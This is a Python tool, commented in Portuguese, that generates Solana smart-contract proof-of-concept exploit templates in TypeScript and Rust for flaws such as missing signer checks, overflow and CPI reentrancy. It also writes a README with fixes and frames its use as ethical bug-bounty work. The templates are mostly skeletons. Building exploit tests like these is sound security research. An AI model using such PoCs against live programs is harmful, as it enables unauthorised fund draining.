"""
Luna PoC Generator
===================
Gera scripts de Proof-of-Concept (PoC) funcionais para vulnerabilidades Solana.

Suporta:
  - Rust (usando solana-program-test + bankrun)
  - TypeScript (usando @coral-xyz/anchor + mocha)

Cada template é parametrizável com:
  - program_id: endereço do programa vulnerável
  - vulnerability_type: tipo da vulnerabilidade
  - target_instruction: instrução explorada
  - accounts: contas necessárias
  - description: descrição da exploração
"""

from __future__ import annotations

import re
import time
from dataclasses import dataclass, field
from enum import Enum
from pathlib import Path
from typing import Optional


# ─── Tipos de vulnerabilidade suportados ─────────────────────────────────────

class VulnType(str, Enum):
    MISSING_SIGNER_CHECK    = "missing_signer_check"
    MISSING_OWNER_CHECK     = "missing_owner_check"
    ARITHMETIC_OVERFLOW     = "arithmetic_overflow"
    PDA_BUMP_MISUSE         = "pda_bump_misuse"
    CPI_REENTRANCY          = "cpi_reentrancy"
    ARBITRARY_CPI           = "arbitrary_cpi"
    ACCOUNT_CONFUSION       = "account_confusion"
    ACCOUNT_CLOSE_EXPLOIT   = "account_close_exploit"
    ORACLE_MANIPULATION     = "oracle_manipulation"
    FLASH_LOAN_ATTACK       = "flash_loan_attack"
    CUSTOM                  = "custom"


@dataclass
class PoCConfig:
    """Configuração para geração de PoC."""
    program_id:          str
    vulnerability_type:  VulnType
    target_instruction:  str
    description:         str
    network:             str = "localnet"     # localnet | devnet | mainnet-beta
    accounts:            list[dict] = field(default_factory=list)  # [{name, pubkey, is_signer, is_writable}]
    exploit_accounts:    list[dict] = field(default_factory=list)  # contas do atacante
    expected_sol_gain:   Optional[float] = None
    notes:               str = ""

    # Preenchidos durante geração
    exploit_summary:     str = ""
    impact_estimate:     str = ""


@dataclass
class PoCResult:
    """Resultado da geração de PoC."""
    config:         PoCConfig
    rust_poc:       Optional[str] = None
    typescript_poc: Optional[str] = None
    readme:         str = ""
    generated_at:   float = field(default_factory=time.time)

    def save(self, output_dir: str) -> list[Path]:
        """Salva os arquivos gerados no diretório especificado."""
        saved = []
        base = Path(output_dir)
        base.mkdir(parents=True, exist_ok=True)

        ts = int(self.generated_at)
        slug = self.config.vulnerability_type.value.replace("_", "-")

        if self.rust_poc:
            p = base / f"poc_{slug}_{ts}.rs"
            p.write_text(self.rust_poc, encoding="utf-8")
            saved.append(p)

        if self.typescript_poc:
            p = base / f"poc_{slug}_{ts}.ts"
            p.write_text(self.typescript_poc, encoding="utf-8")
            saved.append(p)

        if self.readme:
            p = base / f"POC_README_{slug}_{ts}.md"
            p.write_text(self.readme, encoding="utf-8")
            saved.append(p)

        return saved


# ─── Templates de PoC ────────────────────────────────────────────────────────

class PoCTemplates:
    """Biblioteca de templates de PoC para cada tipo de vulnerabilidade."""

    # ── TypeScript (Anchor) ───────────────────────────────────────────────

    @staticmethod
    def ts_missing_signer(cfg: PoCConfig) -> str:
        return f'''\
/**
 * PoC: Missing Signer Check
 * Programa: {cfg.program_id}
 * Instrução: {cfg.target_instruction}
 * Gerado por Luna Hunter-V2
 *
 * Exploit: chama instrução privilegiada sem ser o signer legítimo.
 */

import * as anchor from "@coral-xyz/anchor";
import {{ Program, AnchorProvider, web3 }} from "@coral-xyz/anchor";
import {{ assert }} from "chai";

describe("PoC: Missing Signer Check — {cfg.target_instruction}", () => {{
  const provider = AnchorProvider.env();
  anchor.setProvider(provider);

  const PROGRAM_ID = new web3.PublicKey("{cfg.program_id}");

  // Conta do ATACANTE (não é o owner/admin legítimo)
  const attacker = web3.Keypair.generate();

  before(async () => {{
    // Airdrop SOL para o atacante (em localnet/devnet)
    const sig = await provider.connection.requestAirdrop(
      attacker.publicKey,
      2 * web3.LAMPORTS_PER_SOL
    );
    await provider.connection.confirmTransaction(sig);
    console.log("[+] Atacante:", attacker.publicKey.toBase58());
  }});

  it("Executa instrução privilegiada como atacante não-autorizado", async () => {{
    try {{
      // IDL do programa alvo (carregue o arquivo IDL real aqui)
      // const idl = require("./target/idl/{cfg.target_instruction.lower()}.json");
      // const program = new Program(idl, PROGRAM_ID, provider);

      // Construir a transação manualmente
      const ix = new web3.TransactionInstruction({{
        programId: PROGRAM_ID,
        keys: [
          // VULNERABILIDADE: campo "authority" ou "admin" sem verificação is_signer
          {{ pubkey: attacker.publicKey,   isSigner: true,  isWritable: false }},
          // Adicione as demais contas conforme o IDL
        ],
        // Encode do discriminator da instrução {cfg.target_instruction}
        // Calcule: sha256("global:{cfg.target_instruction.lower()}")[:8]
        data: Buffer.alloc(8, 0), // substitua pelo discriminator real
      }});

      const tx = new web3.Transaction().add(ix);
      const sig = await provider.sendAndConfirm(tx, [attacker]);

      console.log("[+] EXPLOIT BEM-SUCEDIDO! Sig:", sig);
      console.log("[+] O programa aceitou instrução de não-autorizado");

      // Verificar estado: fundos drenados / estado alterado
      // const vaultBalance = await provider.connection.getBalance(vaultAccount);
      // assert.isBelow(vaultBalance, expectedVaultBalance, "Fundos drenados!");

    }} catch (err: any) {{
      if (err.message?.includes("Error Code") || err.message?.includes("constraint")) {{
        console.log("[-] Programa rejeitou (constraint existe):", err.message);
        assert.fail("PoC falhou — programa tem proteção");
      }}
      throw err;
    }}
  }});
}});
'''

    @staticmethod
    def ts_arithmetic_overflow(cfg: PoCConfig) -> str:
        return f'''\
/**
 * PoC: Arithmetic Overflow
 * Programa: {cfg.program_id}
 * Instrução: {cfg.target_instruction}
 *
 * Exploit: envia valores que causam overflow/underflow,
 * permitindo manipulação de saldos ou estado.
 */

import * as anchor from "@coral-xyz/anchor";
import {{ web3 }} from "@coral-xyz/anchor";
import BN from "bn.js";

describe("PoC: Arithmetic Overflow — {cfg.target_instruction}", () => {{
  const provider = anchor.AnchorProvider.env();
  anchor.setProvider(provider);

  const attacker = web3.Keypair.generate();

  before(async () => {{
    const sig = await provider.connection.requestAirdrop(
      attacker.publicKey, 2 * web3.LAMPORTS_PER_SOL
    );
    await provider.connection.confirmTransaction(sig);
  }});

  it("Causa overflow com valor máximo u64", async () => {{
    // Valor que causa overflow em u64 sem checked arithmetic
    const MAX_U64 = new BN("18446744073709551615");
    const OVERFLOW_VALUE = MAX_U64;

    console.log("[*] Tentando overflow com:", OVERFLOW_VALUE.toString());

    // Chamar instrução com valor extremo
    // const result = await program.methods
    //   .{cfg.target_instruction}(OVERFLOW_VALUE)
    //   .accounts({{ ... }})
    //   .signers([attacker])
    //   .rpc();

    // Verificar: saldo manipulado por wrap-around
    // const balance = await getTokenBalance(victimAccount);
    // console.log("[+] Saldo após overflow:", balance);
  }});

  it("Causa underflow subtraindo além do saldo", async () => {{
    const UNDERFLOW_AMOUNT = new BN("999999999999999999");

    // Se o programa usa u64 sem checked_sub, resultado "wraps around"
    // para um número enorme (18446744073709...)
    console.log("[*] Tentando underflow com:", UNDERFLOW_AMOUNT.toString());
  }});
}});
'''

    @staticmethod
    def ts_cpi_reentrancy(cfg: PoCConfig) -> str:
        return f'''\
/**
 * PoC: CPI Reentrancy
 * Programa: {cfg.program_id}
 * Instrução: {cfg.target_instruction}
 *
 * Exploit: programa atacante executa CPI de volta ao programa alvo
 * antes que o estado seja finalizado (similar a reentrancy do Solidity).
 *
 * Nota: Solana tem proteção nativa contra reentrancy em contas com
 * dados mutáveis, mas pode ser contornada com contas read-only.
 */

import * as anchor from "@coral-xyz/anchor";
import {{ web3, BN }} from "@coral-xyz/anchor";

// Programa atacante (deploy este antes de executar o PoC)
const ATTACKER_PROGRAM_IDL = {{
  // IDL do contrato malicioso que faz a chamada de reentrada
  // Deploy com: anchor deploy
}};

describe("PoC: CPI Reentrancy — {cfg.target_instruction}", () => {{
  const provider = anchor.AnchorProvider.env();
  anchor.setProvider(provider);

  it("Executa ataque de reentrancy via CPI", async () => {{
    console.log("[*] Iniciando ataque de reentrancy...");
    console.log("[*] Alvo:", "{cfg.program_id}");

    // Passo 1: Chamar função de withdraw/transfer do programa alvo
    // Passo 2: Durante a execução, o programa atacante (via CPI) chama
    //          a mesma função novamente antes do estado ser atualizado

    // O resultado seria: saldo drenado em múltiplas retiradas
    // enquanto o check de saldo usa o valor inicial (não atualizado)
  }});
}});
'''

    @staticmethod
    def ts_generic(cfg: PoCConfig) -> str:
        return f'''\
/**
 * PoC: {cfg.vulnerability_type.value.replace("_", " ").title()}
 * Programa: {cfg.program_id}
 * Instrução: {cfg.target_instruction}
 * Descrição: {cfg.description}
 *
 * Gerado por Luna Hunter-V2 Elite
 * Data: {time.strftime("%Y-%m-%d %H:%M:%S")}
 */

import * as anchor from "@coral-xyz/anchor";
import {{ Program, AnchorProvider, web3, BN }} from "@coral-xyz/anchor";
import {{ assert }} from "chai";

describe("PoC: {cfg.vulnerability_type.value} — {cfg.target_instruction}", () => {{
  const provider = AnchorProvider.env();
  anchor.setProvider(provider);

  const VICTIM_PROGRAM = new web3.PublicKey("{cfg.program_id}");
  const attacker = web3.Keypair.generate();

  before(async () => {{
    const sig = await provider.connection.requestAirdrop(
      attacker.publicKey, 5 * web3.LAMPORTS_PER_SOL
    );
    await provider.connection.confirmTransaction(sig);
    console.log("Attacker:", attacker.publicKey.toBase58());
  }});

  it("Demonstra a vulnerabilidade", async () => {{
    // TODO: carregar IDL e instanciar o programa
    // const idl = require("./target/idl/PROGRAM.json");
    // const program = new Program(idl, VICTIM_PROGRAM, provider);

    // Contas envolvidas:
    // {chr(10).join(f"    // - {a.get('name', 'unknown')}: {a.get('pubkey', 'TBD')}" for a in cfg.accounts) or "    // Adicione as contas do programa"}

    // Exploit principal:
    // {cfg.exploit_summary or "// Descreva o exploit aqui"}

    // Verificação de impacto:
    // const balanceBefore = ...;
    // await executeExploit();
    // const balanceAfter = ...;
    // assert.isAbove(attackerGain, 0, "Exploit bem-sucedido");

    console.log("[*] Template PoC gerado — adapte conforme o IDL real");
  }});
}});
'''

    # ── Rust (bankrun / solana-program-test) ─────────────────────────────

    @staticmethod
    def rust_missing_signer(cfg: PoCConfig) -> str:
        return f'''\
//! PoC: Missing Signer Check
//! Programa: {cfg.program_id}
//! Instrução: {cfg.target_instruction}
//!
//! Dependências (adicione em Cargo.toml):
//! [dev-dependencies]
//! solana-program-test = "1.18"
//! solana-sdk = "1.18"
//! tokio = {{ version = "1", features = ["full"] }}

#[cfg(test)]
mod poc {{
    use solana_program_test::*;
    use solana_sdk::{{
        account::Account,
        instruction::{{AccountMeta, Instruction}},
        pubkey::Pubkey,
        signature::{{Keypair, Signer}},
        transaction::Transaction,
    }};
    use std::str::FromStr;

    const PROGRAM_ID: &str = "{cfg.program_id}";

    // Discriminator da instrução {cfg.target_instruction}
    // Calcule: sha256("global:{cfg.target_instruction.lower()}")[:8]
    fn instruction_discriminator() -> [u8; 8] {{
        use std::collections::hash_map::DefaultHasher;
        use std::hash::{{Hash, Hasher}};
        // SUBSTITUA pelo discriminator real calculado a partir do IDL
        [0x{cfg.target_instruction[:2].encode().hex()[:2]}, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]
    }}

    #[tokio::test]
    async fn test_missing_signer_exploit() {{
        let program_id = Pubkey::from_str(PROGRAM_ID).unwrap();

        // Configurar ambiente de teste
        let mut program_test = ProgramTest::new(
            "victim_program",
            program_id,
            None, // Carregue o .so compilado aqui se tiver
        );

        let (mut banks_client, payer, recent_blockhash) =
            program_test.start().await;

        // Conta do atacante (não é o authority legítimo)
        let attacker = Keypair::new();
        let airdrop_sig = banks_client
            .process_transaction(Transaction::new_signed_with_payer(
                &[solana_sdk::system_instruction::transfer(
                    &payer.pubkey(),
                    &attacker.pubkey(),
                    1_000_000_000, // 1 SOL
                )],
                Some(&payer.pubkey()),
                &[&payer],
                recent_blockhash,
            ))
            .await;

        // Construir instrução sem o signer correto
        let mut ix_data = instruction_discriminator().to_vec();
        // Adicione argumentos da instrução aqui

        let exploit_ix = Instruction {{
            program_id,
            accounts: vec![
                // EXPLOIT: atacante como authority sem ser o owner real
                AccountMeta::new(attacker.pubkey(), true),  // is_signer=true mas não é o admin
                // Adicione as demais contas
            ],
            data: ix_data,
        }};

        let tx = Transaction::new_signed_with_payer(
            &[exploit_ix],
            Some(&attacker.pubkey()),
            &[&attacker],
            recent_blockhash,
        );

        let result = banks_client.process_transaction(tx).await;

        match result {{
            Ok(_) => {{
                println!("[+] EXPLOIT BEM-SUCEDIDO! Instrução executada sem autorização.");
                // Verificar: estado alterado, fundos drenados
            }}
            Err(e) => {{
                println!("[-] Programa rejeitou: {{:?}}", e);
                println!("[-] Vulnerabilidade pode estar protegida por constraint.");
                panic!("PoC falhou — programa tem proteção adequada");
            }}
        }}
    }}
}}
'''

    @staticmethod
    def rust_generic(cfg: PoCConfig) -> str:
        return f'''\
//! PoC: {cfg.vulnerability_type.value.replace("_", " ").title()}
//! Programa: {cfg.program_id}
//! Instrução: {cfg.target_instruction}
//! Descrição: {cfg.description}
//!
//! Gerado por Luna Hunter-V2 Elite — {time.strftime("%Y-%m-%d")}
//!
//! [dev-dependencies]
//! solana-program-test = "1.18"
//! solana-sdk = "1.18"
//! tokio = {{ version = "1", features = ["full"] }}

#[cfg(test)]
mod poc_{{name}} {{
    use solana_program_test::*;
    use solana_sdk::{{
        instruction::{{AccountMeta, Instruction}},
        pubkey::Pubkey,
        signature::{{Keypair, Signer}},
        transaction::Transaction,
    }};
    use std::str::FromStr;

    #[tokio::test]
    async fn test_{cfg.vulnerability_type.value}_exploit() {{
        let program_id = Pubkey::from_str("{cfg.program_id}").unwrap();

        let mut program_test = ProgramTest::new(
            "victim_program",
            program_id,
            None,
        );

        let (mut banks_client, payer, recent_blockhash) =
            program_test.start().await;

        // TODO: Construir e executar o exploit
        // Tipo: {cfg.vulnerability_type.value}
        // Instrução alvo: {cfg.target_instruction}

        println!("[*] Template Rust PoC gerado — adapte conforme o programa real");
    }}
}}
'''


# ─── Gerador Principal ────────────────────────────────────────────────────────

class PoCGenerator:
    """
    Gera scripts de Proof-of-Concept para vulnerabilidades Solana.

    Uso:
        gen = PoCGenerator()
        cfg = PoCConfig(
            program_id="So11...",
            vulnerability_type=VulnType.MISSING_SIGNER_CHECK,
            target_instruction="withdraw",
            description="Saque sem verificar se o caller é o owner da conta",
        )
        result = gen.generate(cfg)
        result.save("output/poc")
    """

    def generate(self, cfg: PoCConfig, langs: Optional[list[str]] = None) -> PoCResult:
        """
        Gera PoC nos formatos especificados.

        Args:
            cfg: Configuração da vulnerabilidade.
            langs: ["typescript", "rust"] ou None (ambos).
        """
        if langs is None:
            langs = ["typescript", "rust"]

        ts_code: Optional[str] = None
        rust_code: Optional[str] = None

        if "typescript" in langs:
            ts_code = self._generate_typescript(cfg)

        if "rust" in langs:
            rust_code = self._generate_rust(cfg)

        readme = self._generate_readme(cfg, has_ts=ts_code is not None, has_rust=rust_code is not None)

        return PoCResult(
            config=cfg,
            typescript_poc=ts_code,
            rust_poc=rust_code,
            readme=readme,
        )

    def generate_from_finding(
        self,
        program_id: str,
        finding_title: str,
        finding_description: str,
        file_path: Optional[str] = None,
        line: Optional[int] = None,
    ) -> PoCResult:
        """
        Gera PoC automaticamente a partir de um finding do AuditEngine.
        Faz inferência do tipo de vulnerabilidade pelo título/descrição.
        """
        vuln_type = self._infer_vuln_type(finding_title, finding_description)

        # Inferir instrução alvo pelo arquivo
        instruction = "unknown_instruction"
        if file_path:
            m = re.search(r"fn\s+(\w+)", finding_description)
            if m:
                instruction = m.group(1)

        cfg = PoCConfig(
            program_id=program_id,
            vulnerability_type=vuln_type,
            target_instruction=instruction,
            description=finding_description,
            exploit_summary=self._infer_exploit_summary(vuln_type),
            impact_estimate=self._infer_impact(vuln_type),
        )
        if file_path:
            cfg.notes = f"Encontrado em {file_path}:{line or '?'}"

        return self.generate(cfg)

    # ── Internos ──────────────────────────────────────────────────────────

    def _generate_typescript(self, cfg: PoCConfig) -> str:
        """Seleciona template TypeScript baseado no tipo."""
        templates = {
            VulnType.MISSING_SIGNER_CHECK:  PoCTemplates.ts_missing_signer,
            VulnType.MISSING_OWNER_CHECK:   PoCTemplates.ts_missing_signer,  # similar
            VulnType.ARITHMETIC_OVERFLOW:   PoCTemplates.ts_arithmetic_overflow,
            VulnType.CPI_REENTRANCY:        PoCTemplates.ts_cpi_reentrancy,
            VulnType.ARBITRARY_CPI:         PoCTemplates.ts_cpi_reentrancy,
        }
        fn = templates.get(cfg.vulnerability_type, PoCTemplates.ts_generic)
        return fn(cfg)

    def _generate_rust(self, cfg: PoCConfig) -> str:
        """Seleciona template Rust baseado no tipo."""
        templates = {
            VulnType.MISSING_SIGNER_CHECK:  PoCTemplates.rust_missing_signer,
            VulnType.MISSING_OWNER_CHECK:   PoCTemplates.rust_missing_signer,
        }
        fn = templates.get(cfg.vulnerability_type, PoCTemplates.rust_generic)
        return fn(cfg)

    def _generate_readme(self, cfg: PoCConfig, has_ts: bool, has_rust: bool) -> str:
        ts_run = "npx ts-mocha tests/poc_*.ts" if has_ts else ""
        rust_run = "cargo test poc_ -- --nocapture" if has_rust else ""

        return f"""# PoC: {cfg.vulnerability_type.value.replace("_", " ").title()}

**Programa Alvo:** `{cfg.program_id}`
**Instrução Vulnerável:** `{cfg.target_instruction}`
**Tipo:** `{cfg.vulnerability_type.value}`
**Rede:** `{cfg.network}`
**Gerado por:** Luna Hunter-V2 Elite — {time.strftime("%Y-%m-%d %H:%M UTC")}

---

## Descrição da Vulnerabilidade

{cfg.description}

## Impacto

{cfg.impact_estimate or "Avalie o impacto específico para este programa."}

## Passos para Reproduzir

### Pré-requisitos

```bash
# Rust + Solana CLI
curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh
sh -c "$(curl -sSfL https://release.solana.com/v1.18.0/install)"

# Anchor
npm install -g @coral-xyz/anchor-cli

# Node (TypeScript)
npm install @coral-xyz/anchor @solana/web3.js chai mocha ts-mocha typescript
```

### Configurar ambiente

```bash
# Subir validador local
solana-test-validator --reset

# Em outra aba: definir cluster para localnet
solana config set --url localhost
```

### Executar PoC

```bash
{"# TypeScript" if has_ts else ""}
{ts_run}

{"# Rust" if has_rust else ""}
{rust_run}
```

## Evidências Esperadas

- **Antes:** Estado inicial do programa (sem ataque)
- **Após exploit:** Estado alterado / fundos drenados / permissão escalada

{f"**Notas:**{chr(10)}{cfg.notes}" if cfg.notes else ""}

## Correção Recomendada

{_get_fix_recommendation(cfg.vulnerability_type)}

---

*Este PoC foi gerado para fins de Bug Bounty ético (Immunefi). Não use em produção sem autorização.*
"""

    def _infer_vuln_type(self, title: str, desc: str) -> VulnType:
        text = (title + " " + desc).lower()
        if any(k in text for k in ["signer", "unauthorized", "privilege"]):
            return VulnType.MISSING_SIGNER_CHECK
        if any(k in text for k in ["owner", "ownership"]):
            return VulnType.MISSING_OWNER_CHECK
        if any(k in text for k in ["overflow", "underflow", "arithmetic"]):
            return VulnType.ARITHMETIC_OVERFLOW
        if any(k in text for k in ["pda", "bump", "seed"]):
            return VulnType.PDA_BUMP_MISUSE
        if any(k in text for k in ["reentrancy", "cpi", "reentrant"]):
            return VulnType.CPI_REENTRANCY
        if any(k in text for k in ["close", "rent"]):
            return VulnType.ACCOUNT_CLOSE_EXPLOIT
        return VulnType.CUSTOM

    def _infer_exploit_summary(self, vuln_type: VulnType) -> str:
        summaries = {
            VulnType.MISSING_SIGNER_CHECK:  "Chamar instrução privilegiada como qualquer keypair",
            VulnType.MISSING_OWNER_CHECK:   "Passar conta de programa errado como authority",
            VulnType.ARITHMETIC_OVERFLOW:   "Enviar valor MAX_U64 para causar wrap-around",
            VulnType.PDA_BUMP_MISUSE:       "Gerar PDA com bump canônico incorreto",
            VulnType.CPI_REENTRANCY:        "Executar CPI de volta ao programa antes do estado ser atualizado",
            VulnType.ARBITRARY_CPI:         "Substituir program_id em CPI por programa malicioso",
            VulnType.ACCOUNT_CLOSE_EXPLOIT: "Fechar conta e reabrir no mesmo TX para bypass de checks",
        }
        return summaries.get(vuln_type, "Explorar comportamento inesperado do programa")

    def _infer_impact(self, vuln_type: VulnType) -> str:
        impacts = {
            VulnType.MISSING_SIGNER_CHECK:
                "**Critical**: Qualquer conta pode executar operações privilegiadas (drain, admin actions)",
            VulnType.MISSING_OWNER_CHECK:
                "**High**: Dados de programa errado podem ser usados para manipular lógica",
            VulnType.ARITHMETIC_OVERFLOW:
                "**High**: Manipulação de saldos via integer wrap-around",
            VulnType.PDA_BUMP_MISUSE:
                "**Medium-High**: Colisão de PDA permite substituição de contas",
            VulnType.CPI_REENTRANCY:
                "**Critical**: Duplo-gasto ou drain de fundos via execução reentrante",
            VulnType.ARBITRARY_CPI:
                "**Critical**: Programa malicioso executado com authority do programa alvo",
        }
        return impacts.get(vuln_type, "Avalie o impacto específico para este programa.")


def _get_fix_recommendation(vuln_type: VulnType) -> str:
    fixes = {
        VulnType.MISSING_SIGNER_CHECK: """\
```rust
// Adicione constraint de signer na struct de contas:
#[account(mut, constraint = authority.key() == expected_authority.key())]
pub authority: Signer<'info>,
```
Ou use `#[access_control(ctx.accounts.validate())]`.""",

        VulnType.MISSING_OWNER_CHECK: """\
```rust
// Valide o owner explicitamente:
require!(
    ctx.accounts.target.owner == &EXPECTED_PROGRAM_ID,
    ErrorCode::InvalidOwner
);
```""",

        VulnType.ARITHMETIC_OVERFLOW: """\
```rust
// Use checked arithmetic em Rust:
let new_amount = old_amount
    .checked_add(deposit)
    .ok_or(ErrorCode::MathOverflow)?;
```""",

        VulnType.PDA_BUMP_MISUSE: """\
```rust
// Armazene e reutilize o bump canônico na conta:
#[account(
    seeds = [b"vault", user.key().as_ref()],
    bump = vault.canonical_bump,  // use bump armazenado, não recalculado
)]
pub vault: Account<'info, Vault>,
```""",

        VulnType.CPI_REENTRANCY: """\
```rust
// Use Account<> em vez de AccountInfo para contas que participam de CPI:
// Anchor recarrega Account<> após CPI, evitando reads de estado stale.
// Se usar AccountInfo, recarregue manualmente:
vault_info.reload()?;
```""",

        VulnType.ARBITRARY_CPI: """\
```rust
// Valide o program_id antes de qualquer CPI:
require!(
    ctx.accounts.target_program.key() == &EXPECTED_PROGRAM_ID,
    ErrorCode::InvalidProgram
);
```""",
    }
    return fixes.get(vuln_type, "Revise a lógica de validação de contas e constraints.")
